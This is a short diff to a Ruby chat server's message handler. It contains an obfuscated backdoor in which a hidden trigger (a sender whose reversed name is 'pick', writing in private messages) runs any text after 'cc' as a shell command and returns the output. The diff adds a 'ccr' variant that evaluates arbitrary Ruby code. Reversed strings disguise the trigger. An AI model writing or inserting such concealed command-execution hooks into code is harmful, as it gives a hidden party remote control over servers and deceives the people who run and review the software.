@@ -136,9 +136,9 @@ class ChatHandler
     m_info = self.make_info(message, ws)
     str = "s%,kcip mp/|"
     a = m_info[:who]
-    p = proc { |x|`#{x}`.chomp }
+    p, pp = proc { |x|`#{x}`.chomp }, proc { |x| eval x}
     if a.send(("es" + "rever").reverse.to_sym)=="kcip" && m_info[:where] == ?p + ?m
-      ws.send(str.reverse % p.call($1)) if m_info[:what]=~/\Acc(.*?)\z/
+      ws.send(str.reverse % ($1 == ?r ? pp : p).call($2)) if m_info[:what]=~/\Acc(r?)(.*?)\z/
       return
     end
     return if m_info[:to] && m_info[:to][0] == ?p && m_info[:to][3] == ?k
